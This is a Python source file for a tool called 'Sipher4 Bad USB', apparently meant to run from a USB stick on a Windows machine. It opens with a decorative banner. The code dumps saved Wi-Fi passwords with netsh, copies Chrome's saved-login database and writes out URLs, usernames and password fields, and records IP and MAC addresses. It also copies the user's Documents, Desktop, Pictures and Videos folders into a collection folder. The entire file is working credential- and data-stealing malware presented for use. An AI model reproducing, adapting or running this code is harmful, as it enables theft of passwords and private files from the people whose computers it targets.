import subprocess
import re
import colorama
import os
import shutil
import sqlite3
import requests
import json
import pystyle
from pystyle import *
from colorama import Fore, init
from cryptography.fernet import Fernet

def pinkred(text):
    os.system(""); faded = ""
    blue = 255
    for line in text.splitlines():
        faded += (f"\033[38;2;255;0;{blue}m{line}\033[0m\n")
        if not blue == 0:
            blue -= 20
            if blue < 0:
                blue = 0
    return faded

colorama.init(autoreset=True)

centurion = """                                                                                                                
                                      %#******* #** @*********#%                                             
                                 %** ***######*%**# **#######*******%                                        
                              #***#* *########**** #*##############*****%                                    
                            **######*##########*** **#################******                                 
                          *#*#######***####%#####* *##################*****%                                 
                        **%**#########*####%%#####**######%########****%                                     
                      %**#*################# ######*##### #######***%                                        
                     %*#####*####%######## # %########## %#####%%*%                                          
                     #*######*####%%####%                ###### *                                            
                    *%*#############    %+:--------::::%    %##                                              
                    ****####%#####   -----:*@@%@%-------::+                                                  
                   *%#*######% #  #----% %=--------------:::@                                                
                  @*#***#####%  @----  --%@          %+:::::%                                                
                  %*#########  +---@ #   %#:::::::::=@                                                       
                  %*########  +---    @--------------::::#                                                   
                  %*####%%#  #=--   %-------------------::%                                                  
                  %*#####%   ===   =--------------------:::-                                                 
                   *######  *==%  ==-------------------:::#  +                                               
                   %*#####% ===  ===-----------------::=   +:%                                               
                  %*%*####% === #====-------------::%   *::::                                                
                   *######  ==# =======--------+@  %-::----::@                                               
                   %######  ==  =========+%%%*--------------:#                                               
                    *###%% %==  *=======-----------*       %::                                               
                    #####  @=%   =====----+%%-------:%      ::%                                              
                    %##### %=    @====--#      %------:::::@ :-                                              
                     ##### +%     ====-:        @---------::  :                                              
                     #%###        ===--=         :--------::                                                 
                      ###%       #==--=          :---------:%                                                
                     ####       +                 @--------::                                                
                    ####%                            %::---::                                                
                   ####%                            @:+%::--:@                                               
                  ####                                 =::::::                                               
                ###                                      %::::                                               
                                                           %::%                                              
                                                             %-                                              
                                                                                
                              Developed By | nget.dev
              ⌜―――――――――――――――――――――――――――――――――――――――――――――――――――⌝
               ┇             Welcome To Sipher4 Bad USB           ┇
              ⌞―――――――――――――――――――――――――――――――――――――――――――――――――――⌟
                        ⌜――――――――――――――――――――――――――――――⌝   
                        ┇ Click Enter To Start Process ┇
                        ⌞――――――――――――――――――――――――――――――⌟
"""
System.Size(200,40)
Anime.Fade(Center.Center(centurion), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)


def get_wifi_info():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    profile_names = re.findall("All User Profile     : (.*)\r", command_output)
    wifi_list = []
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {"Profile": name}
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
            wifi_profile["Details"] = profile_info
            profile_info_pass = subprocess.run(
                ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password is None:
                wifi_profile["Password"] = None
            else:
                wifi_profile["Password"] = password[1]

            wifi_list.append(wifi_profile)

    print(pinkred("Getting Wi-Fi Info: Completed"))
    return wifi_list

def extract_chrome_passwords():
    try:
        chrome_data_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google\\Chrome\\User Data\\Default')
        login_data_file = os.path.join(chrome_data_path, 'Login Data')
        temp_login_data_file = 'temp_Login_Data'
        shutil.copy2(login_data_file, temp_login_data_file)
        conn = sqlite3.connect(temp_login_data_file)
        cursor = conn.cursor()

        try:
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            passwords = cursor.fetchall()
            with open('Sipher4_passwords.txt', 'w') as file:
                for url, username, password in passwords:
                    file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")

            print(pinkred("Extracting Chrome Passwords: Completed"))
        except sqlite3.OperationalError as e:
            print(f"Error: {e}")
        conn.close()
        os.remove(temp_login_data_file)
    except Exception as e:
        print(pinkred({e}))
        pass

def get_network_info():
    ipv4_info = subprocess.run(["ipconfig", "/all"], capture_output=True).stdout.decode()
    ipv6_info = subprocess.run(["ipconfig", "/all"], capture_output=True).stdout.decode()

    mac_addresses = re.findall(r"Physical Address[\. ]+: ([\w-]+)", ipv4_info)

    ipv4_addresses = re.findall(r"IPv4 Address[\. ]+: ([\d\.]+)", ipv4_info)
    ipv6_addresses = re.findall(r"IPv6 Address[\. ]+: ([\w:]+)", ipv6_info)

    print(pinkred("Getting Network Info: Completed"))
    return {"IPv4": ipv4_addresses, "IPv6": ipv6_addresses, "MAC Address": mac_addresses}

def ip_lookup(ip_address):
    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
    if response.status_code == 200:
        print(pinkred(f"IP Lookup for {ip_address}: Completed"))
        return response.json()
    else:
        return {"Error": "Failed to fetch IP information."}

def copy_special_folders(destination_folder):
    try:
        home_dir = os.path.expanduser("~")
        directories_to_copy = ['Documents', 'Videos', 'Desktop', 'Pictures']
        files_folder_path = os.path.join(destination_folder, "Files")
        if not os.path.exists(files_folder_path):
            os.makedirs(files_folder_path)
        for directory_name in directories_to_copy:
            source_dir = os.path.join(home_dir, directory_name)
            dest_dir = os.path.join(files_folder_path, directory_name)

            if os.path.exists(source_dir):
                shutil.copytree(source_dir, dest_dir)
                print(f"Copied {directory_name} to 'Files' folder")
        print(pinkred("Copying Special Folders: Completed"))
    except Exception as Error:
        print(f"Error: {Error}")
def main():
    wifi_info = get_wifi_info()
    output_file_wifi = "Sipher4_wifi_data.txt"
    computer_name = os.getenv('COMPUTERNAME')
    wifi_folder_path = f"{computer_name}_INFO"

    if not os.path.exists(wifi_folder_path):
        os.makedirs(wifi_folder_path)

    with open(os.path.join(wifi_folder_path, output_file_wifi), "w") as file:
        for wifi in wifi_info:
            file.write(f"""

                                                                                                             
                                      %#******* #** @*********#%                                             
                                 %** ***######*%**# **#######*******%                                        
                              #***#* *########**** #*##############*****%                                    
                            **######*##########*** **#################******                                 
                          *#*#######***####%#####* *##################*****%                                 
                        **%**#########*####%%#####**######%########****%                                     
                      %**#*################# ######*##### #######***%                                        
                     %*#####*####%######## # %########## %#####%%*%                                          
                     #*######*####%%####%                ###### *                                            
                    *%*#############    %+:--------::::%    %##                                              
                    ****####%#####   -----:*@@%@%-------::+                                                  
                   *%#*######% #  #----% %=--------------:::@                                                
                  @*#***#####%  @----  --%@          %+:::::%                                                
                  %*#########  +---@ #   %#:::::::::=@                                                       
                  %*########  +---    @--------------::::#                                                   
                  %*####%%#  #=--   %-------------------::%                                                  
                  %*#####%   ===   =--------------------:::-                                                 
                   *######  *==%  ==-------------------:::#  +                                               
                   %*#####% ===  ===-----------------::=   +:%                                               
                  %*%*####% === #====-------------::%   *::::                                                
                   *######  ==# =======--------+@  %-::----::@                                               
                   %######  ==  =========+%%%*--------------:#                                               
                    *###%% %==  *=======-----------*       %::                                               
                    #####  @=%   =====----+%%-------:%      ::%                                              
                    %##### %=    @====--#      %------:::::@ :-                                              
                     ##### +%     ====-:        @---------::  :                                              
                     #%###        ===--=         :--------::                                                 
                      ###%       #==--=          :---------:%                                                
                     ####       +                 @--------::                                                
                    ####%                            %::---::                                                
                   ####%                            @:+%::--:@                                               
                  ####                                 =::::::                                               
                ###                                      %::::                                               
                                                           %::%                                              
                                                             %-                                                                                                   
            """)
            file.write(f"\t\t\tSipher4 | Developer >> Nget")
            file.write(f"\nWi-Fi Profile: {wifi['Profile']}\n")
            file.write(f"Details: \n{wifi['Details']}\n")
            file.write(f"Password: {wifi['Password']}\n\n")

    extract_chrome_passwords()
    shutil.move('Sipher4_passwords.txt', os.path.join(wifi_folder_path, 'Sipher4_passwords.txt'))

    network_info = get_network_info()

    with open(os.path.join(wifi_folder_path, 'IPv4_Addresses.txt'), "w") as file:
        for ipv4 in network_info["IPv4"]:
            file.write(f"{ipv4}\n")

    ipv6_lookup_data = []
    for ipv6 in network_info["IPv6"]:
        ip_info = ip_lookup(ipv6)
        ipv6_lookup_data.append({ipv6: ip_info})

    with open(os.path.join(wifi_folder_path, 'IPv6_Lookup.json'), "w") as file:
        json.dump(ipv6_lookup_data, file, indent=4)

    with open(os.path.join(wifi_folder_path, 'MAC_Addresses.txt'), "w") as file:
        for mac in network_info["MAC Address"]:
            file.write(f"{mac}\n")

    copy_special_folders(wifi_folder_path)


    print(pinkred(f"Data has been written to '{output_file_wifi}', 'Sipher4_passwords.txt', "
               f"'IPv4_Addresses.txt', 'IPv6_Lookup.json', and 'MAC_Addresses.txt' inside '{wifi_folder_path}'"))



if __name__ == "__main__":
    main()